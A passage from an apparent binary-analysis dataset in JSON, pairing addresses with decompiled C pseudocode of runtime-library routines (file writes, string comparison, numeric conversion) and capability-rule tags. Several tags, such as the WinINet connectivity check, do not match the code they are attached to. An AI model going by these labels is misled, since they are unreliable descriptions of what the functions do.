fcn.00403a1e();\n        *puVar4 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 340
    },
    "0040bd95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040bd95(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    iStack20 = param_1;\n    uStack28 = 0x40bd50;\n    uStack32 = *in_FS_OFFSET;\n    uVar2 = *0x412058 ^ &uStack32;\n    *in_FS_OFFSET = &uStack32;\n    while( true ) {\n        uVar1 = *(param_1 + 0xc);\n        if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;\n        uStack24 = *(*(param_1 + 8) + uVar1 * 0xc);\n        *(param_1 + 0xc) = uStack24;\n        if (*(*(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {\n            fcn.0040be45(0x101, uVar2);\n            fcn.0040be64();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 294
    },
    "0040bf48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x0040c205)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bf48(uint32_t arg_8h, uint *arg_ch, uint32_t nNumberOfBytesToWrite)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint16_t uVar3;\n    int16_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    char cVar11;\n    uint32_t uVar12;\n    uint32_t unaff_EBX;\n    uint unaff_EBP;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint32_t var_1ae4h;\n    uint CodePage;\n    uint hFile;\n    uint32_t var_1ad8h;\n    uint *lpNumberOfBytesWritten;\n    int32_t var_1ad0h;\n    uint var_1acch;\n    uint32_t var_1ac8h;\n    uint32_t var_1ac1h;\n    uint32_t lpWideCharStr;\n    uint var_1ab8h;\n    uint var_1410h;\n    uint var_6b8h;\n    uint uStackY52;\n    uint uStackY48;\n    uint uStackY44;\n    uint *puStackY40;\n    int32_t iStackY36;\n    uint arg_10h;\n    uint32_t lpBuffer;\n    uint var_4h;\n    \n    fcn.0040d610();\n    var_1ac8h = 0;\n    var_1ad0h = 0;\n    if (nNumberOfBytesToWrite == 0) goto code_r0x0040c637;\n    if (arg_ch == NULL) {\n        lpBuffer = 0x40bf92;\n        puVar5 = fcn.00403a31();\n        *puVar5 = 0;\n        lpBuffer = 0x40bf99;\n        puVar5 = fcn.00403a1e();\n        *puVar5 = 0x16;\n        lpBuffer = 0x40bfa4;\n        fcn.00403521();\n        goto code_r0x0040c637;\n    }\n    piVar1 = (arg_8h >> 5) * 4 + 0x4138a0;\n    iVar14 = (arg_8h & 0x1f) * 0x40;\n    cVar11 = *(*piVar1 + 0x24 + iVar14) * '\\x02' >> 1;\n    lpBuffer = unaff_EBX;\n    if (((cVar11 == '\\x02') || (cVar11 == '\\x01')) && ((~nNumberOfBytesToWrite & 1) == 0)) {\n        puVar5 = fcn.00403a31();\n        *puVar5 = 0;\n        puVar5 = fcn.00403a1e();\n        *puVar5 = 0x16;\n        fcn.00403521();\n        goto code_r0x0040c637;\n    }\n    if ((*(*piVar1 + 4 + iVar14) & 0x20) != 0) {\n        iStackY36 = 0x40c01b;\n        fcn.0040c7f2(arg_8h, 0, 0, 2);\n    }\n    iVar6 = fcn.004081cc(arg_8h);\n    if ((iVar6 == 0) || ((*(iVar14 + 4 + *piVar1) & 0x80) == 0)) {\ncode_r0x0040c2c8:\n        if ((*(*piVar1 + 4 + iVar14) & 0x80) == 0) {\n            iStackY36 = *(*piVar1 + iVar14);\n            puStackY40 = 0x40c590;\n            iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n            uVar12 = var_1ac8h;\n            if (iVar6 == 0) {\ncode_r0x0040c5a9:\n                var_1ac8h = uVar12;\n                lpWideCharStr = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            else {\n                lpWideCharStr = 0;\n                var_1ac8h = var_1ad8h;\n            }\ncode_r0x0040c5b5:\n            if (var_1ac8h != 0) goto code_r0x0040c637;\n            goto code_r0x0040c5be;\n        }\n        lpWideCharStr = 0;\n        if (cVar11 == '\\0') {\n            puVar5 = arg_ch;\n            if (nNumberOfBytesToWrite == 0) goto code_r0x0040c5f4;\n            do {\n                uVar13 = 0;\n                uVar12 = puVar5 - arg_ch;\n                puVar9 = &fcn.0040bf48::var_1ab8h;\n                do {\n                    if (nNumberOfBytesToWrite <= uVar12) break;\n                    cVar11 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    uVar12 = uVar12 + 1;\n                    if (cVar11 == '\\n') {\n                        *puVar9 = '\\r';\n                        puVar9 = puVar9 + 1;\n                        uVar13 = uVar13 + 1;\n                    }\n                    *puVar9 = cVar11;\n                    puVar9 = puVar9 + 1;\n                    uVar13 = uVar13 + 1;\n                } while (uVar13 < 0x13ff);\n                iStackY36 = *(iVar14 + *piVar1);\n                puStackY40 = 0x40c35e;\n                iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                uVar12 = var_1ac8h;\n                if (iVar6 == 0) goto code_r0x0040c5a9;\n                var_1ac8h = var_1ac8h + var_1ad8h;\n            } while ((puVar9 - &fcn.0040bf48::var_1ab8h <= var_1ad8h) && (puVar5 - arg_ch < nNumberOfBytesToWrite));\n            goto code_r0x0040c5b5;\n        }\n        if (cVar11 == '\\x02') {\n            puVar5 = arg_ch;\n            if (nNumberOfBytesToWrite != 0) {\n                do {\n                    stack0xffffe53c = 0;\n                    uVar12 = puVar5 - arg_ch;\n                    puVar9 = &fcn.0040bf48::var_1ab8h;\n                    do {\n                        if (nNumberOfBytesToWrite <= uVar12) break;\n                        uVar3 = *puVar5;\n                        puVar5 = puVar5 + 2;\n                        uVar12 = uVar12 + 2;\n                        if (uVar3 == 10) {\n                            *puVar9 = 0xd;\n                            puVar9 = puVar9 + 2;\n                            unique0x00007a00 = stack0xffffe53c + 2;\n                        }\n                        unique0x00007a00 = stack0xffffe53c + 2;\n                        *puVar9 = uVar3;\n                        puVar9 = puVar9 + 2;\n                    } while (unique0x00007a00 < 0x13fe);\n                    iStackY36 = *(iVar14 + *piVar1);\n                    puStackY40 = 0x40c438;\n                    iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                    uVar12 = var_1ac8h;\n                    if (iVar6 == 0) goto code_r0x0040c5a9;\n                    var_1ac8h = var_1ac8h + var_1ad8h;\n                } while ((puVar9 - &fcn.0040bf48::var_1ab8h <= var_1ad8h) && (puVar5 - arg_ch < nNumberOfBytesToWrite));\n                goto code_r0x0040c5b5;\n            }\n        }\n        else {\n            lpNumberOfBytesWritten = arg_ch;\n            if (nNumberOfBytesToWrite != 0) {\n                do {\n                    stack0xffffe53c = 0;\n                    uVar12 = lpNumberOfBytesWritten - arg_ch;\n                    puVar5 = &fcn.0040bf48::var_6b8h;\n                    do {\n                        if (nNumberOfBytesToWrite <= uVar12) break;\n                        uVar3 = *lpNumberOfBytesWritten;\n                        lpNumberOfBytesWritten = lpNumberOfBytesWritten + 2;\n                        uVar12 = uVar12 + 2;\n                        if (uVar3 == 10) {\n                            *puVar5 = 0xd;\n                            puVar5 = puVar5 + 2;\n                            unique0x00007a00 = stack0xffffe53c + 2;\n                        }\n                        unique0x00007a00 = stack0xffffe53c + 2;\n                        *puVar5 = uVar3;\n                        puVar5 = puVar5 + 2;\n                    } while (unique0x00007a00 < 0x6a8);\n                    iVar7 = 0;\n                    puStackY40 = &fcn.0040bf48::var_6b8h;\n                    iStackY36 = (puVar5 - puStackY40) / 2;\n                    uStackY44 = 0;\n                    uStackY48 = 0xfde9;\n                    uStackY52 = 0x40c508;\n                    iVar6 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                    uVar12 = var_1ac8h;\n                    if (iVar6 == 0) goto code_r0x0040c5a9;\n                    do {\n                        iStackY36 = *(iVar14 + *piVar1);\n                        puStackY40 = 0x40c539;\n                        iVar10 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                        if (iVar10 == 0) {\n                            lpWideCharStr = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            break;\n                        }\n                        iVar7 = iVar7 + var_1ad8h;\n                    } while (iVar7 < iVar6);\n                } while ((iVar6 <= iVar7) &&\n                        (var_1ac8h = lpNumberOfBytesWritten - arg_ch,  var_1ac8h < nNumberOfBytesToWrite));\n                goto code_r0x0040c5b5;\n            }\n        }\n    }\n    else {\n        iVar6 = fcn.00403718();\n        iVar6 = *(*(iVar6 + 0x6c) + 0x14);\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)();\n        if ((iVar7 == 0) || ((iVar6 == 0 && (cVar11 == '\\0')))) goto code_r0x0040c2c8;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetConsoleCP)();\n        if (nNumberOfBytesToWrite != 0) {\n            stack0xffffe53c = 0;\n            puVar5 = arg_ch;\n            do {\n                uVar12 = var_1ac8h;\n                if (cVar11 == '\\0') {\n                    cVar2 = *puVar5;\n                    var_1ae4h = cVar2 == '\\n';\n                    iVar6 = *piVar1 + iVar14;\n                    if (*(iVar6 + 0x38) == 0) {\n                        iVar6 = fcn.00408556(cVar2);\n                        if (iVar6 == 0) {\n                            arg_10h = 1;\n                            puVar9 = puVar5;\n                            goto code_r0x0040c12f;\n                        }\n                        if (arg_ch + (nNumberOfBytesToWrite - puVar5) < 0x2) {\n                            var_1ac8h = var_1ac8h + 1;\n                            *(iVar14 + 0x34 + *piVar1) = *puVar5;\n                            *(iVar14 + 0x38 + *piVar1) = 1;\n                            break;\n                        }\n                        iVar6 = fcn.0040d924(&fcn.0040bf48::lpWideCharStr, puVar5, 2);\n                        if (iVar6 == -1) break;\n                        puVar5 = puVar5 + 1;\n                        unique0x00007a80 = stack0xffffe53c + 1;\n                    }\n                    else {\n                        lpBuffer._0_2_ = CONCAT11(cVar2, *(iVar6 + 0x34));\n                        lpBuffer = lpBuffer & 0xffff0000 | lpBuffer;\n                        *(iVar6 + 0x38) = 0;\n                        arg_10h = 2;\n                        puVar9 = &fcn.0040bf48::lpBuffer;\ncode_r0x0040c12f:\n                        iVar6 = fcn.0040d924(&fcn.0040bf48::lpWideCharStr, puVar9, arg_10h);\n                        if (iVar6 == -1) break;\n                    }\n                    iStackY36 = 1;\n                    puStackY40 = &fcn.0040bf48::lpWideCharStr;\n                    uStackY44 = 0;\n                    puVar5 = puVar5 + 1;\n                    unique0x00007a80 = stack0xffffe53c + 1;\n                    uStackY52 = 0x40c16e;\n                    uStackY48 = uVar8;\n                    iVar6 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                    if (iVar6 == 0) break;\n                    iStackY36 = *(iVar14 + *piVar1);\n                    puStackY40 = 0x40c197;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                    if (iVar7 == 0) goto code_r0x0040c5a9;\n                    var_1ac8h = unique0x00007a80 + var_1ad0h;\n                    if (0 < iVar6) break;\n                    uVar12 = var_1ac8h;\n                    if (var_1ae4h != 0) {\n                        lpBuffer = CONCAT31(lpBuffer._1_3_, 0xd);\n                        iStackY36 = *(iVar14 + *piVar1);\n                        puStackY40 = 0x40c1f0;\n                        iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                        if (iVar6 == 0) goto code_r0x0040c5a9;\n                        break;\n                    }\n                }\n                else {\n                    if ((cVar11 == '\\x01') || (cVar11 == '\\x02')) {\n                        lpWideCharStr = *puVar5;\n                        var_1ae4h = lpWideCharStr == 10;\n                        puVar5 = puVar5 + 2;\n                        unique0x00007a80 = stack0xffffe53c + 2;\n                    }\n                    if ((cVar11 == '\\x01') || (cVar11 == '\\x02')) {\n                        iVar4 = fcn.0040d7cc(lpWideCharStr);\n                        if (iVar4 != lpWideCharStr) goto code_r0x0040c5a9;\n                        uVar12 = var_1ac8h + 2;\n                        if (var_1ae4h != 0) {\n                            lpWideCharStr = 0xd;\n                            iVar4 = fcn.0040d7cc(0xd);\n                            if (iVar4 != lpWideCharStr) goto code_r0x0040c5a9;\n                            var_1ad0h = var_1ad0h + 1;\n                            uVar12 = var_1ac8h + 3;\n                        }\n                    }\n                }\n                var_1ac8h = uVar12;\n            } while (stack0xffffe53c < nNumberOfBytesToWrite);\n            goto code_r0x0040c5b5;\n        }\ncode_r0x0040c5be:\n        if (lpWideCharStr != 0) {\n            if (lpWideCharStr == 5) {\n                puVar5 = fcn.00403a1e();\n                *puVar5 = 9;\n                puVar5 = fcn.00403a31();\n                *puVar5 = 5;\n            }\n            else {\n                fcn.00403a44(lpWideCharStr);\n            }\n            goto code_r0x0040c637;\n        }\n    }\ncode_r0x0040c5f4:\n    if (((*(iVar14 + 4 + *piVar1) & 0x40) == 0) || (*arg_ch != '\\x1a')) {\n        puVar5 = fcn.00403a1e();\n        *puVar5 = 0x1c;\n        puVar5 = fcn.00403a31();\n        *puVar5 = 0;\n    }\ncode_r0x0040c637:\n    fcn.00405fff(unaff_EBP);\n    return;\n}\n",
        "token_count": 3863
    },
    "0040ca7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040ca7e(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    fcn.004023de(arg_14h);\n    if (*(var_10h + 8) == 0) {\n        iVar1 = fcn.0040dbd5(arg_8h, arg_ch, arg_10h);\n        if (var_8h != '\\0') {\n            *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n            return iVar1;\n        }\n    }\n    else if (arg_8h == NULL) {\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 0x16;\n        fcn.00403521();\n        if (var_8h != '\\0') {\n            *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n        }\n        iVar1 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 0x16;\n        fcn.00403521();\n        if (var_8h != '\\0') {\n            *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n        }\n        iVar1 = 0x7fffffff;\n    }\n    else {\n        do {\n            uVar4 = *arg_8h;\n            arg_10h = arg_10h + -1;\n            puVar6 = arg_8h + 1;\n            if ((*(uVar4 + 0x1d + var_10h) & 4) == 0) {\n                if ((*(uVar4 + var_10h + 0x1d) & 0x10) != 0) {\n                    uVar4 = *(uVar4 + var_10h + 0x11d);\n                }\n                var_4h._0_2_ = uVar4;\n                uVar3 = var_4h;\n            }\n            else if (*puVar6 == 0) {\n                var_4h._0_2_ = 0;\n                uVar3 = var_4h;\n            }\n            else {\n                uVar3 = CONCAT11(*arg_8h, *puVar6);\n                puVar6 = arg_8h + 2;\n                if ((uVar3 < *(var_10h + 0x10)) || (*(var_10h + 0x12) <= uVar3 && uVar3 != *(var_10h + 0x12))) {\n                    if ((*(var_10h + 0x16) <= uVar3) && (uVar3 < *(var_10h + 0x18) || uVar3 == *(var_10h + 0x18))) {\n                        uVar3 = uVar3 + *(var_10h + 0x1a);\n                    }\n                }\n                else {\n                    uVar3 = uVar3 + *(var_10h + 0x14);\n                }\n            }\n            uVar4 = *arg_ch;\n            puVar5 = arg_ch + 1;\n            if ((*(uVar4 + 0x1d + var_10h) & 4) == 0) {\n                if ((*(uVar4 + var_10h + 0x1d) & 0x10) != 0) {\n                    uVar4 = *(uVar4 + var_10h + 0x11d);\n                }\n                var_4h._0_2_ = uVar4;\n            }\n            else if (*puVar5 == 0) {\n                var_4h._0_2_ = 0;\n            }\n            else {\n                var_4h._0_2_ = CONCAT11(*arg_ch, *puVar5);\n                puVar5 = arg_ch + 2;\n                if ((var_4h < *(var_10h + 0x10)) || (*(var_10h + 0x12) <= var_4h && var_4h != *(var_10h + 0x12))) {\n                    if ((*(var_10h + 0x16) <= var_4h) && (var_4h < *(var_10h + 0x18) || var_4h == *(var_10h + 0x18))) {\n                        var_4h._0_2_ = var_4h + *(var_10h + 0x1a);\n                    }\n                }\n                else {\n                    var_4h._0_2_ = var_4h + *(var_10h + 0x14);\n                }\n            }\n            if (var_4h != uVar3) {\n                iVar1 = (-(var_4h < uVar3) & 2) - 1;\n                if (var_8h == '\\0') {\n                    return iVar1;\n                }\n                *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n                return iVar1;\n            }\n        } while ((uVar3 != 0) && (arg_ch = puVar5,  arg_8h = puVar6,  arg_10h != 0));\n        if (var_8h != '\\0') {\n            *(var_ch + 0x70) = *(var_ch + 0x70) & 0xfffffffd;\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1372
    },
    "0040cc63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: cchCount1\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl\nfcn.0040cc63(uint Locale, uint dwCmpFlags, uint8_t *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t CodePage)\n\n{\n    uint32_t arg_8h;\n    code *pcVar1;\n    uint8_t *puVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint8_t *in_EDX;\n    uint *arg_8h_00;\n    int32_t iStack108;\n    uint uStack104;\n    uint8_t *puStack100;\n    int32_t iStack96;\n    uint *puStack92;\n    int32_t iStack84;\n    uint uStack80;\n    uint8_t *puStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint *puStack64;\n    uint var_38h;\n    uint32_t cchCount1;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *lpString1;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    puVar2 = arg_10h;\n    iVar5 = arg_14h;\n    if (arg_14h < 1) {\n        if (arg_14h < -1) goto code_r0x0040cebf;\n    }\n    else {\n        do {\n            iVar5 = iVar5 + -1;\n            if (*puVar2 == 0) goto code_r0x0040cc9a;\n            puVar2 = puVar2 + 1;\n        } while (iVar5 != 0);\n        iVar5 = -1;\ncode_r0x0040cc9a:\n        arg_14h = arg_14h + (-1 - iVar5);\n    }\n    puVar2 = in_EDX;\n    iVar5 = arg_18h;\n    if (arg_18h < 1) {\n        if (arg_18h < -1) goto code_r0x0040cebf;\n    }\n    else {\n        do {\n            iVar5 = iVar5 + -1;\n            if (*puVar2 == 0) goto code_r0x0040ccbd;\n            puVar2 = puVar2 + 1;\n        } while (iVar5 != 0);\n        iVar5 = -1;\ncode_r0x0040ccbd:\n        arg_18h = arg_18h + (-1 - iVar5);\n    }\n    if (CodePage == 0) {\n        CodePage = *(*in_ECX + 4);\n    }\n    if ((arg_14h == 0) || (arg_18h == 0)) {\n        if (arg_14h == arg_18h) {\ncode_r0x0040ccfc:\n            puStack64 = 0x2;\n            goto code_r0x0040cebf;\n        }\n        if (1 < arg_18h) goto code_r0x0040cebf;\n        if (arg_14h < 2) {\n            puStack64 = &fcn.0040cc63::lpCPInfo;\n            iStack68 = CodePage;\n            iStack72 = 0x40cd27;\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n            if (iVar5 == 0) goto code_r0x0040cebf;\n            if (arg_14h < 1) {\n                if (0 < arg_18h) {\n                    if (1 < lpCPInfo) {\n                        puVar3 = &fcn.0040cc63::var_12h;\n                        while ((var_12h != 0 && (*(puVar3 + 1) != 0))) {\n                            if ((*puVar3 <= *in_EDX) && (*in_EDX <= *(puVar3 + 1))) goto code_r0x0040ccfc;\n                            puVar3 = puVar3 + 2;\n                            var_12h._0_1_ = *puVar3;\n                        }\n                    }\n                    goto code_r0x0040cebf;\n                }\n                goto code_r0x0040cd94;\n            }\n            if (1 < lpCPInfo) {\n                puVar3 = &fcn.0040cc63::var_12h;\n                while ((var_12h != 0 && (*(puVar3 + 1) != 0))) {\n                    if ((*puVar3 <= *arg_10h) && (*arg_10h <= *(puVar3 + 1))) goto code_r0x0040ccfc;\n                    puVar3 = puVar3 + 2;\n                    var_12h._0_1_ = *puVar3;\n                }\n            }\n        }\n        puStack64 = 0x3;\n        goto code_r0x0040cebf;\n    }\ncode_r0x0040cd94:\n    pcVar1 = _sym.imp.KERNEL32.dll_MultiByteToWideChar;\n    puStack64 = NULL;\n    iStack68 = 0;\n    puStack76 = arg_10h;\n    uStack80 = 9;\n    iStack84 = CodePage;\n    puVar3 = &stack0xffffffac;\n    iStack72 = arg_14h;\n    cchCount1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (cchCount1 == 0) goto code_r0x0040cebf;\n    if ((cchCount1 < 1) || (0xffffffe0 / cchCount1 < 2)) {\n        lpString1 = NULL;\n    }\n    else {\n        uVar4 = cchCount1 * 2 + 8;\n        if (uVar4 < 0x401) {\n            fcn.0040bd00();\n            lpString1 = &stack0xffffffac;\n            if (*0x10 != 0x54) {\n                iStack84 = 0xcccc;\ncode_r0x0040cdf5:\n                lpString1 = puVar3 + 2;\n            }\n        }\n        else {\n            puStack92 = 0x40cdea;\n            puVar3 = fcn.0040bacc(uVar4);\n            lpString1 = puVar3;\n            if (puVar3 != NULL) {\n                *puVar3 = 0xdddd;\n                goto code_r0x0040cdf5;\n            }\n        }\n    }\n    if (lpString1 == NULL) goto code_r0x0040cebf;\n    puStack92 = lpString1;\n    iStack96 = arg_14h;\n    puStack100 = arg_10h;\n    uStack104 = 1;\n    iStack108 = CodePage;\n    iVar5 = (*pcVar1)();\n    if (iVar5 != 0) {\n        puVar3 = &stack0xffffff94;\n        uVar4 = (*pcVar1)(CodePage, 9, in_EDX, arg_18h, 0, 0);\n        if (uVar4 != 0) {\n            if ((uVar4 < 1) || (0xffffffe0 / uVar4 < 2)) {\n                arg_8h_00 = NULL;\n            }\n            else {\n                arg_8h = uVar4 * 2 + 8;\n                if (arg_8h < 0x401) {\n                    fcn.0040bd00();\n                    arg_8h_00 = &stack0xffffff94;\n                    if (*0x10 != 0x6c) {\n                        iStack108 = 0xcccc;\ncode_r0x0040ce75:\n                        arg_8h_00 = puVar3 + 2;\n                    }\n                }\n                else {\n                    puVar3 = fcn.0040bacc(arg_8h);\n                    arg_8h_00 = puVar3;\n                    if (puVar3 != NULL) {\n                        *puVar3 = 0xdddd;\n                        goto code_r0x0040ce75;\n                    }\n                }\n            }\n            if (arg_8h_00 != NULL) {\n                iVar5 = (*pcVar1)(CodePage, 1, in_EDX, arg_18h, arg_8h_00, uVar4);\n                if (iVar5 != 0) {\n                    (*_sym.imp.KERNEL32.dll_CompareStringW)(Locale, dwCmpFlags, lpString1, cchCount1, arg_8h_00, uVar4);\n                }\n                fcn.00407a81(arg_8h_00);\n            }\n        }\n    }\n    fcn.00407a81(lpString1);\ncode_r0x0040cebf:\n    fcn.00405fff(cchCount1);\n    return;\n}\n",
        "token_count": 1993
    },
    "0040d04f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * fcn.0040d04f(void)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint var_4h;\n    \n    puVar1 = NULL;\n    if (in_EAX != NULL) {\n        iVar2 = *in_EAX;\n        piVar4 = in_EAX;\n        while (iVar2 != 0) {\n            piVar4 = piVar4 + 1;\n            puVar1 = puVar1 + 1;\n            iVar2 = *piVar4;\n        }\n        puVar1 = fcn.004075fc(puVar1 + 1, 4);\n        if (puVar1 == NULL) {\n            fcn.0040173a(9);\n        }\n        iVar2 = *in_EAX;\n        puVar5 = puVar1;\n        if (iVar2 != 0) {\n            do {\n                uVar3 = fcn.0040dc28(iVar2);\n                *puVar5 = uVar3;\n                puVar5 = puVar5 + 1;\n                iVar2 = *((in_EAX - puVar1) + puVar5);\n            } while (iVar2 != 0);\n        }\n        *puVar5 = 0;\n    }\n    return puVar1;\n}\n",
        "token_count": 309
    },
    "0040d420": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d420(char *arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = arg_10h;\n    uVar8 = 0;\n    var_4h._0_2_ = 0x404e;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    arg_10h[2] = 0;\n    if (arg_ch != 0) {\n        uVar5 = 0;\n        arg_10h = NULL;\n        do {\n            uVar9 = *puVar4;\n            uVar1 = puVar4[1];\n            uVar2 = puVar4[2];\n            bVar3 = false;\n            uVar6 = (uVar8 * 2 | uVar5 >> 0x1f) * 2 | uVar5 * 2 >> 0x1f;\n            uVar5 = uVar5 * 4;\n            uVar8 = (arg_10h * 2 | uVar8 >> 0x1f) * 2 | uVar8 * 2 >> 0x1f;\n            uVar7 = uVar9 + uVar5;\n            *puVar4 = uVar5;\n            puVar4[1] = uVar6;\n            puVar4[2] = uVar8;\n            if ((uVar7 < uVar5) || (uVar7 < uVar9)) {\n                bVar3 = true;\n            }\n            *puVar4 = uVar7;\n            uVar5 = uVar6;\n            if (bVar3) {\n                bVar3 = false;\n                uVar5 = uVar6 + 1;\n                if ((uVar5 < uVar6) || (uVar5 == 0)) {\n                    bVar3 = true;\n                }\n                puVar4[1] = uVar5;\n                if (bVar3) {\n                    uVar8 = uVar8 + 1;\n                    puVar4[2] = uVar8;\n                }\n            }\n            bVar3 = false;\n            uVar9 = uVar5 + uVar1;\n            if ((uVar9 < uVar5) || (uVar9 < uVar1)) {\n                bVar3 = true;\n            }\n            puVar4[1] = uVar9;\n            if (bVar3) {\n                uVar8 = uVar8 + 1;\n                puVar4[2] = uVar8;\n            }\n            bVar3 = false;\n            arg_10h = (uVar8 + uVar2) * 2 | uVar9 >> 0x1f;\n            uVar8 = uVar7 * 2;\n            uVar9 = uVar9 * 2 | uVar7 >> 0x1f;\n            puVar4[2] = arg_10h;\n            *puVar4 = uVar8;\n            puVar4[1] = uVar9;\n            uVar5 = uVar8 + *arg_8h;\n            if ((uVar5 < uVar8) || (uVar5 < *arg_8h)) {\n                bVar3 = true;\n            }\n            *puVar4 = uVar5;\n            uVar8 = uVar9;\n            if (bVar3) {\n                uVar8 = uVar9 + 1;\n                bVar3 = false;\n                if ((uVar8 < uVar9) || (uVar8 == 0)) {\n                    bVar3 = true;\n                }\n                puVar4[1] = uVar8;\n                if (bVar3) {\n                    arg_10h = arg_10h + 1;\n                    puVar4[2] = arg_10h;\n                }\n            }\n            arg_ch = arg_ch + -1;\n            arg_8h = arg_8h + 1;\n            puVar4[1] = uVar8;\n            puVar4[2] = arg_10h;\n        } while (arg_ch != 0);\n    }\n    if (puVar4[2] == 0) {\n        uVar8 = puVar4[1];\n        do {\n            var_4h._0_2_ = var_4h + -0x10;\n            uVar5 = uVar8 >> 0x10;\n            uVar8 = uVar8 << 0x10 | *puVar4 >> 0x10;\n            puVar4[1] = uVar8;\n            *puVar4 = *puVar4 << 0x10;\n        } while (uVar5 == 0);\n        puVar4[2] = uVar5;\n    }\n    uVar8 = puVar4[2];\n    if ((uVar8 & 0x8000) == 0) {\n        uVar5 = puVar4[1];\n        do {\n            var_4h._0_2_ = var_4h + -1;\n            uVar9 = uVar8 * 2;\n            uVar8 = uVar9 | uVar5 >> 0x1f;\n            